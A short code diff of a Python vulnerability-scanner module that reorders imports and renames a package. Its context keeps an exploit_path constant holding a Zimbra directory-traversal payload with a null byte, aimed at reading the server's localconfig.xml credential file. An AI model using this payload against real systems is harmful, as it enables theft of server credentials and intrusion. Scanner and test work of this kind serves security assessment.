@@ -1,14 +1,16 @@
 #!/usr/bin/python
 #coding=utf-8
-import requests
 import urlparse
+
+import requests
 from requests.packages.urllib3.exceptions import *
+
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 requests.packages.urllib3.disable_warnings(SNIMissingWarning)
 requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
 
 
-from PackageThread.JobQueue import Job
+from PackageScanner.JobQueue import Job
 from PackageHTTP.UserAgents import getRandomAgent
 
 exploit_path = '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00'
